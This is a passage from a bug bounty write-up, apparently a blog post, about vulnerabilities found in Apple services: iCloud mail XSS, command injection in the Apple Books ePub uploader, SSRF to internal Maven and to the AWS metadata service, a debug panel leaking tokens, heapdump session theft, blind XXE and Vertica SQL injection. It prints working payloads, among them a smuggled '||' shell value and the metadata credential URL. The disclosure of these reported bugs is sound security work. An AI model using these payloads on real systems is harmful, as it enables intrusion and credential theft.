                                                                            </p><pre><code>&lt;a href=&#34;https://www.icloud.com/mail#&lt;a href=&#34; https:=&#34;&#34; www.icloud.com=&#34;&#34; onmouseover=&#34;location=/javascript:alert%28document.domain%29/.source;//&amp;quot;&#34;&gt;https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//&lt;/a&gt;</code></pre><p>
                                                                                And gave us this beautiful alert prompt:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss.png 795w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss-300x162.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss-768x415.png 768w" sizes="(max-width: 795px) 100vw, 795px"/></figure><p>
                                                                                This payload was from a CTF solution by @Blaklis_. I had originally thought it might be an unexploitable XSS, but there seems to always be a solution somewhere for edge case XSS.
                                                                            </p><div class="embed-placeholder" data-type="twitter" data-id="1125663871056928769"><iframe scrolling="no" frameborder="0" allowfullscreen="true" title="Twitter Tweet" src="https://platform.twitter.com/embed/index.html?dnt=true&amp;embedId=twitter-widget-1&amp;frame=false&amp;hideCard=false&amp;hideThread=false&amp;id=1125663871056928769&amp;lang=en&amp;origin=https%3A%2F%2Fsamcurry.net%2Fhacking-apple%2F&amp;theme=light&amp;widgetsVersion=ed20a2b%3A1601588405575&amp;width=550px" name="twitter-widget-1"></iframe></div><p>
                                                                                My best explanation here is that (1) when loading the initial URL the characters within the “&lt;script&gt;&lt;/script&gt;” were acceptable within the automatic hyperlinking process and didn’t break it, then (2) the removal of the script tags created a space or some sort of void which reset the automatic hyperlinking functionality without closing the initial hyperlinking functionality, and lastly (3) the second hyperlink added the additional quote that was used to both break out of the href and create the onmouseover event handler.
                                                                            </p><p>
                                                                                The impact for the second XSS was the same as the first one, except for this one the user would have to trigger the onmouseover event handler via putting their mouse somewhere within the email body, but this part could be simplified to trigger more easily by making the hyperlink of the entire email.
                                                                            </p><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Create a worm that has the capability to silently exfiltrate/modify iCloud account information including photos and videos</li><li>Silently execute arbitrary HTML and JavaScript within the victim&#39;s browser</li></ul><h2>
                                                                                Command Injection in Author’s ePublisher
                                                                            </h2><p>
                                                                                A major feature of Apple is the ability to upload and sell books, movies, tv shows, and songs. The files you upload get propagated to various Apple services such as iTunes where people can download or purchase them. This seemed like a good vector for customer XSS and blind XSS against employees.
                                                                            </p><p>
                                                                                In order to upload files, we first had to apply for access to the service on iTunes Connect.
                                                                            </p><p>
                                                                                We ran into an interesting problem where we did not have access to an iPad or iPhone, but we kept on looking for ways to use this service still. After some investigating, we discovered a tool called Transporter.
                                                                            </p><p>
                                                                                <a href="https://help.apple.com/itc/transporteruserguide/#/">Transporter</a> is a Java app that can be used to interact with a jsonrpc API for bulk uploading files utilizing a few different file services.
                                                                            </p><p>
                                                                                At the same time, we were also looking through the iTunes Connect Book <a href="https://itunespartner.apple.com/books/">help docs</a> and we found a page that explained a few different ways to upload books including an online web service: <a href="https://itunespartner.apple.com/books/articles/submit-your-ebook-2717">https://itunespartner.apple.com/books/articles/submit-your-ebook-2717</a>
                                                                            </p><p>
                                                                                This led us to the following service, <a href="https://authors.apple.com/epub-upload">Apple Books for Authors</a>.
                                                                            </p><p>
                                                                                This service only has a couple of features:
                                                                            </p><ul><li>Sign-in / Register</li><li>Upload images for book cover</li><li>Upload book ePub file</li><li>Upload book Sample ePub file</li></ul><p>
                                                                                The first thing we did was download sample epub files and upload them. Funny enough, the first epub file we grabbed was an epub version 1 format with invalid xhtml. The publish tool spit out a huge wall of text of errors to let us know why it failed to upload/validate.
                                                                            </p><p>
                                                                                <strong>HTTP Request:</strong>
                                                                            </p><pre><code>POST /api/v1/validate/epub HTTP/1.1
Host: authors.apple.com
{&#34;epubKey&#34;:&#34;2020_8_11/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub&#34;,&#34;providerId&#34;:&#34;BrettBuerhaus2096637541&#34;}</code></pre><p>
                                                                                <strong>HTTP Response:</strong>
                                                                            </p><pre><code>[2020-08-11 21:49:59 UTC] &lt;main&gt; DBG-X:   parameter TransporterArguments = -m validateRawAssets -assetFile /tmp/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub -dsToken **hidden value** -DDataCenters=contentdelivery.itunes.apple.com -Dtransporter.client=BooksPortal -Dcom.apple.transporter.updater.disable=true -verbose eXtreme -Dcom.transporter.client.version=1.0 -itc_provider BrettBuerhaus2096637541</code></pre><p>
                                                                                As you can probably guess at this point, all we had to do was a simple command injection on the provderId JSON value.
                                                                            </p><p>
                                                                                We intercepted the request on the next upload and replaced it with:
                                                                            </p><pre><code>&#34;providerId&#34;:&#34;BrettBuerhaus2096637541||test123&#34;</code></pre><p>
                                                                                And we got the following output:
                                                                            </p><pre><code>/bin/sh: 1: test123: not found</code></pre><p>
                                                                                The following is a screenshot showing the output of &#34;<em>ls /</em>&#34;:
                                                                            </p><figure><img src="https://i.imgur.com/njo88pO.png" alt=""/></figure><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Execute arbitrary commands on the authors.apple.com webserver</li><li>Access Apple&#39;s internal network</li></ul><p>
                                                                                This was a good exercise in making sure you fully explore what you are testing. A lot of the big names in recon research talk about creating mind maps and this is an example of that. We started with iTunes Connect, started exploring Books, and continued to branch out until we fully understood what services exist around that single feature.
                                                                            </p><p>
                                                                                It also is a good reminder that you need to find as much information as possible before you start going down rabbit-holes while testing. Without exploring the help docs, you may have missed the web epub app entirely as it is a single link on one page.
                                                                            </p><h2>
                                                                                Full Response SSRF on iCloud allows Attacker to Retrieve Apple Source Code
                                                                            </h2><p>
                                                                                The most elusive bug while hacking on Apple was full response SSRF. We found nearly a dozen blind or semi-blind SSRFs, but had a terribly hard time trying to find any way to retrieve the response. This was incredibly frustrating as during our recon process we found tons of references to what appeared to be awesome internal applications for source code management, user management, information lookup, and customer support.
                                                                            </p><p>
                                                                                It wasn’t until the end of our engagement when we finally stumbled upon one which seemed to have a great deal of internal network access.
                                                                            </p><p>
                                                                                During testing the iCloud application we noticed that you could open up certain attachments from the iCloud mail application in the iCloud pages application via the “Open in Pages” functionality. When you submitted the form to do this, it sent an HTTP request containing a URL parameter which included the URL of the mail file attachment in the request. If you attempted to modify this URL to something arbitrary, the request would fail and give a “400 Bad Request” error. The process would create a “job” where the response of the HTTP request was converted into an Apple Pages document, then opened in a new tab.
                                                                            </p><figure><img src="https://i.imgur.com/g6oTd8y.png" alt=""/></figure><p>
                                                                                It seemed to only allow URLs from the “p37-mailws.icloud.com” domain, would not convert pages with anything but a 200 OK HTTP response, and would additionally be a bit hard to test as the conversion process was done through multiple HTTP requests and a job queue.
                                                                            </p><figure><img src="https://i.imgur.com/FCrEKbj.png" alt=""/></figure><p>
                                                                                What worked to exploit this was appending “@ourdomain.com” after the white-listed domain which would point the request at our domain. The process would convert the raw HTML to an Apple pages file then display it to us in a new window. This was a bit annoying to fuzz with, so Brett ended up throwing together a python script to automate the process.
                                                                            </p><p>
                                                                                Our proof of concept for this report was demonstrating we could read and access Apple’s internal maven repository. We did not access any source code nor was this ever exploited by other actors.
                                                                            </p><p>
                                                                                If the file was too large to be saved to a Pages file, it would instead be stored to the drive in a downloadable zip file which would allow us to extract large files like jars and zips.
                                                                            </p><p>
                                                                                We had found the internal maven URL disclosed in a Github repository.
                                                                            </p><figure><img src="https://i.imgur.com/gzyxzAr.png" alt=""/></figure><p>
                                                                                There were many other internal applications we could’ve pulled from, but since we demonstrated access to the Maven repository with source code access we reported the issue right away.
                                                                            </p><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Read the various iOS source code files within the maven repository</li><li>Access anything else available within Apple&#39;s internal network</li><li>Fully compromise a victim&#39;s session via a cross-site scripting vulnerability due to the disclosed HTTP only cookies within the HTTP request</li></ul><p>
                                                                                The full process that had to be followed when scripting this is as follows:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process.png 831w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process-244x300.png 244w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/process-768x945.png 768w" sizes="(max-width: 831px) 100vw, 831px"/></figure><h2>
                                                                                Nova Admin Debug Panel Access via REST Error Leak
                                                                            </h2><p>
                                                                                While going through a list of all Apple subdomains one at a time, we discovered some interesting functionality from &#34;concierge.apple.com&#34;, &#34;s.apple.com&#34;, and &#34;events.apple.com&#34;.
                                                                            </p><p>
                                                                                With a little bit of Google dorking, we found that a specific request to &#34;s.apple.com&#34; would take you to &#34;events.apple.com&#34; with an authentication token.
                                                                            </p><p>
                                                                                <strong>HTTP Request:</strong>
                                                                            </p><pre><code>GET /dQ{REDACTED}fE HTTP/1.1
Host: s.apple.com</code></pre><p>
                                                                                <strong>HTTP Response:</strong>
                                                                            </p><pre><code>HTTP/1.1 200
Server: Apple
Location: https://events.apple.com/content/events/retail_nso/ae/en/applecampathome.html?token=fh{REDACTED}VHUba&amp;a=1&amp;l=e</code></pre><p>
                                                                                Performing our standard recon techniques, we grabbed the JavaScript files and started looking for endpoints and API routes.
                                                                            </p><figure><img src="https://i.imgur.com/Khvao1e.png" alt=""/></figure><p>
                                                                                Discovering a /services/public/account endpoint, we started to play around with it. We quickly discovered that passing in an invalid marketCode parameter resulted in the server returning a REST exception error.
                                                                            </p><p>
                                                                                <strong>HTTP Request:</strong>
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1.png 783w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1-300x61.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1-768x156.png 768w" sizes="(max-width: 783px) 100vw, 783px"/></figure><p>
                                                                                <strong>HTTP Response:</strong>
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1-300x115.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1-768x294.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                From the error message we can see the server is forwarding an API request to the following location:
                                                                            </p><pre><code>https://nova-admin.corp.apple.com/services/locations/searchLocation?locationName=t&amp;rtm=1</code></pre><p>
                                                                                We can also see that it leaked some request/response headers including a nova-admin cookie and an authorization token that the server is sending to make requests to nova-admin.corp.apple.com API requests.
                                                                            </p><p>
                                                                                Also interesting is that the /services/ endpoint is similar to the /services/public/ API endpoints for the events app. We could not hit the endpoints on the event app and we did not have access to nova-admin.corp.apple.com. Going back to our recon data, we noticed that there is a nova.apple.com.
                                                                            </p><p>
                                                                                Attempting to use the acquired auth token and cookie, we noted that the credentials were valid as we were no longer being redirected to idsmac auth, but it was still 403 forbidden.
                                                                            </p><p>
                                                                                With a little bit of fuzzing, we discovered that we were able to hit /services/debug.func.php.
                                                                            </p><p>
                                                                                Even though it was not a website with PHP extensions, it appeared adding any extension to the debug route would bypass the route restrictions they built since the authorization was separate from the functionality itself.
                                                                            </p><p>
                                                                                <strong>HTTP Request:</strong>
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one.png 913w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one-300x66.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one-768x168.png 768w" sizes="(max-width: 913px) 100vw, 913px"/></figure><p>
                                                                                <strong>HTTP Response:</strong>
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/new_two-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/new_two-1.png 635w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/new_two-1-300x94.png 300w" sizes="(max-width: 635px) 100vw, 635px"/></figure><p>
                                                                                This portal contained dozens of options, also contained several hundred configuration parameters and values.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1.png 884w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1-300x227.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1-768x581.png 768w" sizes="(max-width: 884px) 100vw, 884px"/></figure><p>
                                                                                One of the values also contained an AWS secret key, another contained server crontabs. Having the ability to update these values was enough to prove command injection.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3.png 882w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3-300x83.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3-768x212.png 768w" sizes="(max-width: 882px) 100vw, 882px"/></figure><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Execute arbitrary commands on the nova.apple.com webserver</li><li>Access Apple&#39;s internal network</li></ul><p>
                                                                                At this point, we decided we had proven enough impact and stopped. The full flow from above is as follows:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1.png 801w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1-253x300.png 253w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1-768x912.png 768w" sizes="(max-width: 801px) 100vw, 801px"/></figure><h2>
                                                                                AWS Secret Keys via PhantomJS iTune Banners and Book Title XSS
                                                                            </h2><p>
                                                                                We discovered the iTunes banner maker website a few weeks prior to finding this vulnerability. It was not until we added a book via iTunes Connect did we discover an interesting feature on the banner maker.
                                                                            </p><figure><img src="https://i.imgur.com/a94Z6xV.png" alt=""/></figure><p>
                                                                                There are multiple banner image formats based on the height and width specified. We discovered that the &#34;300x250&#34; banner image included the book name.
                                                                            </p><p>
                                                                                We also noticed that it was vulnerable to Cross-Site Scripting because the book name was underlined with our injected &#34;&lt;u&gt;&#34; element which we had set whilst registering the book on iTunes connect.
                                                                            </p><figure><img src="https://i.imgur.com/KvHUtLU.png" alt=""/></figure><p>
                                                                                Image URL:
                                                                            </p><pre><code>https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&amp;t=catalog_black&amp;c=us&amp;l=en-US&amp;id=1527342866&amp;w=300&amp;h=250&amp;store=books&amp;cache=false</code></pre><p>
                                                                                Earlier we had already discovered that there was path traversal and parameter injection in a few of the request parameters such as &#34;pr&#34;. For example:
                                                                            </p><pre><code>https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes/../../&amp;t=catalog_black&amp;c=us&amp;l=en-US&amp;id=1527342866&amp;w=300&amp;h=250&amp;store=books&amp;cache=false</code></pre><p>
                                                                                Results in a picture of the AWS S3 error page:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/banner.png" alt=""/></figure><p>
                                                                                From here we made the assumption that they were using a headerless browser client to take screenshots of HTML files inside of an S3 bucket. So the next step was to create a book with &lt;script src=””&gt; in the name to start playing around with the XSS in the image generation process.
                                                                            </p><p>
                                                                                The first thing we noticed was in the request log when it hit our server:
                                                                            </p><pre><code>54.210.212.22 - - [21/Aug/2020:15:54:07 +0000] &#34;GET /imgapple.js?_=1598025246686 HTTP/1.1&#34; 404 3901 &#34;http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&amp;t=catalog_white&amp;c=us&amp;l=en-US&amp;id=1528672619&amp;w=300&amp;h=250&amp;store=books&amp;cache=false&#34; &#34;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1&#34;</code></pre><p>
                                                                                This is the S3 bucket / image it was hitting to generate the picture:
                                                                            </p><pre><code>http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&amp;t=catalog_white&amp;c=us&amp;l=en-US&amp;id=1528672619&amp;w=300&amp;h=250&amp;store=books&amp;cache=false</code></pre><p>
                                                                                And this is the User-Agent:
                                                                            </p><pre><code>PhantomJS/2.1.1</code></pre><p>
                                                                                Luckily for us, Brett had actually exploited exactly this a few years prior:
                                                                            </p><div class="embed-placeholder" data-type="twitter" data-id="880498767551541248"><iframe scrolling="no" frameborder="0" allowfullscreen="true" title="Twitter Tweet" src="https://platform.twitter.com/embed/index.html?dnt=true&amp;embedId=twitter-widget-2&amp;frame=false&amp;hideCard=false&amp;hideThread=false&amp;id=880498767551541248&amp;lang=en&amp;origin=https%3A%2F%2Fsamcurry.net%2Fhacking-apple%2F&amp;theme=light&amp;widgetsVersion=ed20a2b%3A1601588405575&amp;width=550px" name="twitter-widget-2"></iframe></div><p>
                                                                                The first thing was to write our JS XSS payload to perform Server-Side Request Forgery attacks. A good method to do this and render data is with the &lt;iframe&gt; element.
                                                                            </p><p>
                                                                                Since we know this on AWS, we attempt to hit AWS metadata URI:
                                                                            </p><pre><code>https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&amp;t=catalog_black&amp;c=us&amp;l=en-US&amp;id=1528672619%26cachebust=12345%26url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance%26&amp;w=800&amp;h=800&amp;store=books&amp;cache=false</code></pre><p>
                                                                                This rendered a new banner image with the full AWS secret keys for an ec2 and iam role:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/image-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/image-1.png 600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/image-1-300x136.png 300w" sizes="(max-width: 600px) 100vw, 600px"/></figure><p>
                                                                                Most of Apple’s interesting infrastructure appears to be in the /8 IP CIDR they own dubbed “Applenet,” but they do have quite a bit of hosts and services in AWS ec2/S3. We knew the SSRF would not be super interesting with the recon we performed as most of the interesting corp targets are in Applenet and not AWS.
                                                                            </p><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Read contents from Apple&#39;s internal Amazon Web Services environment</li><li>Access and use the AWS ec2 keys discloses within the internal metadata page</li></ul><h2>
                                                                                Heap Dump on Apple eSign Allows Attacker to Compromise Various External Employee Management Tools
                                                                            </h2><p>
                                                                                During our initial recon phase collecting sub-domains and discovering the Apple public-facing surface, we found a bunch of “esign” servers.
                                                                            </p><ul><li>https://esign-app-prod.corp.apple.com/</li><li>https://esign-corpapp-prod.corp.apple.com/</li><li>https://esign-internal.apple.com</li><li>https://esign-service-prod.corp.apple.com</li><li>https://esign-signature-prod.corp.apple.com</li><li>https://esign-viewer-prod.corp.apple.com/</li><li>https://esign.apple.com/</li></ul><p>
                                                                                Upon loading the subdomain, you’re immediately redirected to a /viewer folder. When you go through the Apple idmsa authentication flow, you are returned to an “you are not authorized” error.
                                                                            </p><figure><img src="https://i.imgur.com/tFKClIe.png" alt=""/></figure><p>
                                                                                We do not have access to any links or interesting js files from this page, so we tried some basic wordlists to see if we could find endpoints for the application. From here we discovered that <strong>/viewer/actuator</strong> responded with all of the actuator endpoints including mapping and heapdump.
                                                                            </p><figure><img src="https://i.imgur.com/eo7Yjbt.png" alt=""/></figure><p>
                                                                                We were unable to make changes by sending state-changing requests to actuator in an attempt for Remote Code Execution, so we had to find an alternative route for proving impact.
                                                                            </p><p>
                                                                                The mappings exposed all the web routes to us, including additional folders at the root of the host that had additional actuator heapdumps in them. It was at this point that we realized the actuator endpoints were vulnerable in each app folder on all esign subdomains. From here we grabbed a heapdump from ensign-internal.
                                                                            </p><p>
                                                                                We loaded the heapdump using Eclipse Memory Analyzer and exported all the strings out to csv to sift with grep.
                                                                            </p><figure><img src="https://i.imgur.com/xScEqqm.png" alt=""/></figure><p>
                                                                                From there we learned that the application’s authentication cookie is “acack”. We searched for acack in the heapdump until we found a valid session cookie. <strong>At this point we were certain that it was an Apple employee token and not a customer, otherwise we would not have tested it.</strong> Upon loading it, we were able to access the application.
                                                                            </p><p>
                                                                                There’s not much we can show, but here’s a snippet showing the authenticated view of the page:
                                                                            </p><figure><img src="https://i.imgur.com/hHMpEmz.png" alt=""/></figure><p>
                                                                                This gave us access to 50+ application endpoints, including some admin endpoints such as “setProxy” that would likely have been easily escalated to an internal SSRF or RCE. We also noticed that the acack cookie was authenticating us to other applications as well.
                                                                            </p><p>
                                                                                Having proven sufficient impact we stopped here and reported it.
                                                                            </p><p>
                                                                                Actuators exposing heapdumps public-facing are nothing new and it’s a relatively low-hanging finding that most wordlists will catch. It’s important to remember that just because you aren’t finding them commonly, they’re still out there and on big targets just waiting to be found by an attacker.
                                                                            </p><h2>
                                                                                XML External Entity processing to Blind SSRF on Java Management API
                                                                            </h2><p>
                                                                                During testing, we discovered an API with multiple unauthenticated functions that all consumed &#34;application/xml&#34; after finding an exposed &#34;application.wadl&#34; on one of the many 17.0.0.0/8 hosts.
                                                                            </p><p>
                                                                                An application.wadl file defines the endpoints used by this service. This was a test instance of a service that is normally locked down and inaccessible.
                                                                            </p><p>
                                                                                We were able to use a blind XXE payload to demonstrate a blind SSRF.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp.png 1021w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp-300x90.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp-768x229.png 768w" sizes="(max-width: 1021px) 100vw, 1021px"/></figure><p>
                                                                                Sadly, we were not able to fully exploit this to read files on this machine or get a response back from an SSRF due to the Java version used on this machine (fully patched, preventing a 2 stage blind XXE payload). Additionally we did not know the expected XML format structure (preventing a non-blind XXE exploit).
                                                                            </p><p>
                                                                                This vulnerability was interesting as Apple is heavily XML dependent and it felt like we would’ve found more instances of XXE with how many requests we’d seen using it. It was surprising exploiting this one because to achieve blind XXE as it was very straightforward compared to all of the complicated ways we’d tried to identify it over time.
                                                                            </p><p>
                                                                                If we were to ever successfully exploit this to achieve local file read or full response SSRF, it would likely be through finding the proper XML format for the API itself in order to reflect the file contents directly versus achieve blind exfiltration.
                                                                            </p><p>
                                                                                Overall, an attacker could&#39;ve abused this to...
                                                                            </p><ul><li>Obtain what are essentially keys to various internal and external employee applications</li><li>Disclose various secrets (database credentials, OAuth secrets, private keys) from the various esign.apple.com applications</li></ul><h2>
                                                                                GBI Vertica SQL Injection and Exposed GSF API
                                                                            </h2><p>
                                                                                Our initial recon efforts involved capturing screenshots of all Apple owned domains and IP addresses that responded with an HTTP banner. We found a couple servers that looked like this:
                                                                            </p><figure><img src="https://i.imgur.com/MDNTLze.png" alt=""/></figure><p>
                                                                                From here we started to mess around with some of the applications such as &#34;/depReports&#34;. We could authenticate to them and access some data via API requests to an API on the &#34;/gsf/&#34; route. All of the applications that we accessed on this host routed requests through that GSF service.
                                                                            </p><p>
                                                                                The request looked like the following:
                                                                            </p><pre><code>POST /gsf/partShipment/businessareas/AppleCare/subjectareas/acservice/services/batch HTTP/1.1
Host: gbiportal-apps-external-msc.apple.com
{
    &#34;executionType&#34;: &#34;parallel&#34;,
    &#34;requests&#34;: [{
        &#34;queryName&#34;: &#34;redacted&#34;,
        &#34;filters&#34;: {
            &#34;redacted_id&#34;: [&#34;redacted&#34;],
            &#34;redacted&#34;: [&#34;&#34;]
        }
    }, {
        &#34;queryName&#34;: &#34;redacted&#34;,
        &#34;filters&#34;: {
            &#34;redacted_id&#34;: [&#34;redacted&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;service_notification_number&#34;],
            &#34;redacted&#34;: [&#34;desc&#34;]
        }
    }, {
        &#34;queryName&#34;: &#34;redacted&#34;,
        &#34;filters&#34;: {
            &#34;redacted_id&#34;: [&#34;redacted&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;&#34;],
            &#34;redacted&#34;: [&#34;service_notification_number&#34;],
            &#34;redacted&#34;: [&#34;desc&#34;],
            &#34;redacted&#34;: [&#34;100&#34;],
            &#34;redacted&#34;: [&#34;0&#34;]
        }
    }]
}
</code></pre><p>
                                                                                You can see almost immediately that there are some really strong indicators here that they are interacting with SQL. Keywords: query, limit, offset, column names, filter, etc. Making one tiny change to see what happens, we got the following:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1-300x105.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1-768x268.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                (Heavily redacted, covering up the query error that includes column names, table name, database name, etc). The important bit is:
                                                                            </p><pre><code>exception is java.sql.SQLException: java.sql.SQLSyntaxErrorException: [Vertica][VJDBC](4856) ERROR: Syntax error at or near \&#34;adesc\&#34;&#34;}]}]}</code></pre><p>
                                                                                We eventually got a union injection working. Some important parts were the extra &#34;*/*/&#34; closing comments in limit due to stacking queries. We also had to use /**/ between FROM and table as vSQL has some protections built into it against SQL injection.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1-300x197.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1-768x503.png 768w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                There is no vSQLMap, so a lot of manual effort went into getting a working injection:
                                                                            </p><figure><img src="https://i.imgur.com/IkhPzKv.png" alt=""/></figure><p>
                                                                                Once we got it working, we decided to script it out to make it easier. We uploaded a gist of it on Github here:
                                                                            </p><p>
                                                                                If anyone is interested in Vertica SQL injection, I highly recommend checking out their SQL docs. There are some interesting functions that could be leveraged to take the injection further, e.g.
                                                                            </p><p>
                                                                                If configured with AWS keys, you can use the SQL injection to pull AWS secret keys off of the server. In our case, this wasn’t configured for AWS so we were not able to do that.
                                                                            </p><p>
                                                                                We had enough information to report the SQL injection at this point. We decided to explore the &#34;/gsf/&#34; API a bit more as we figured they might ACL off this host and it would no longer be public-facing.
                                                                            </p><figure><img src="https://i.imgur.com/7zTie1a.png" alt=""/></figure><p>
